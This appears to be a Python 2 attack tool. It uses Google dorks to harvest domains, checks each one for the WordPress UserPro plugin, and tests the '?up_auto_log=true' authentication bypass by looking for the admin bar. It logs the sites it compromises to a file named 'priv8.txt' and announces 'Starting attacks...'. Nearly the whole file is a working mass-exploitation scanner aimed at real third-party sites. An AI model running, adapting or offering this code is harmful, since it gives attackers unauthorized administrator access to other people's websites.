#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
B = '\033[1;34m' #Blue
import bs4
import time
from urllib2 import quote
from socket import timeout
from urllib2 import urlopen
from urllib2 import Request
def tracker(keywords, start):
        searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
        try:
            url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
                start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
            req = Request(url)  # Sets the SERPs URL!!
        except timeout:
            print("Connection timed out!")
        req.add_header('User-Agent',
                       'userpro1 aef by orm')
        serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
        soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
        allResults = []  # An Empty Array to Save the Results
        i=0
        for hit in soup.findAll('cite'):  # a for-each loop, to check all <cite ....> Elements in Page
              # if the domain was between <cite> and </cite>
            allResults.append(
                  str("")+hit.text)  # Results will add to allResults
            i=i+1
        if (len(allResults) == 0):
            return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
        else:
            print(""+B+"[*]"+N+" Ok! Starting... \n")

            for element in allResults:  # Prints all the results
                if (element.startswith("http://")):
                    element = element[7:]
                if (element.startswith("https://")):
                     element = element[8:]
                if (element.startswith("www.")):
                    element = element[4:]
                element=element[:element.find("/")]
                element="http://"+element
                print("checking "+element+" :")
                if (checkwp(element)):
                    suc = str(checkVul(element))
                    if( suc=="True"):
                        try:
                            filee = open("priv8.txt", mode="a+")
                            filee.write(element+"\n")
                            filee.close()
                        except:
                            print(""+R+"error"+N+"")
                        print (suc)
                    else:
                        print (""+R+"False"+N+"")

                else:
                   print (element + ""+R+" =>"+N+" " + str(checkwp(element)))


def checkwp(url):
    url+="/wp-content/plugins/userpro/css/userpro.min.css"
    try:
     pURL = urlopen(url).read()
    except:
        return False
    if (pURL.find(".userpro")>-1):
        print (""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n")
        return True
    else:
        return False
def checkVul(url):
    url1=url + "/?up_auto_log=true"
    try:
        pURL = urlopen(url1).read()
        if (pURL.find("admin-bar-css")>-1):
           return True
        elif (urlopen(url + "/wp-admin").read().find("admin-bar-css")>-1):
            return True
        else :return False
    except:
        return False
while(True):
    x = raw_input(""+N+"(dorks)> ("+R+"usr_pro_wordpress_auto_find"+N+"): ")
    time.sleep(1)
    print "DORKS => "+R+"",x
    n= raw_input(""+N+"(start-number)> ("+R+"usr_pro_wordpress_auto_find"+N+"): ")
    print "START NUMBER => "+R+"",n
    g= raw_input(""+N+"(end-number)> ("+R+"usr_pro_wordpress_auto_find"+N+"): ")
    print "END NUMBER => "+R+"",g
    run = raw_input(""+N+"(console)> ("+R+"usr_pro_wordpress_auto_find"+N+"): ")
    if run == "run":
    	print ""+B+"[*] "+N+"Starting attacks..."
    while(True):
        tracker(x, n)
        y=raw_input(""+B+"[*]"+N+" Next (y/n)?")
        if(y=="y"):
            n+=g;
            tracker(x, n)
        else:
            break
    y1=raw_input(""+B+"[*]"+N+" Anouther dork (y/n) ?")
    if (y1 == "y"):
        continue
    else:
        break
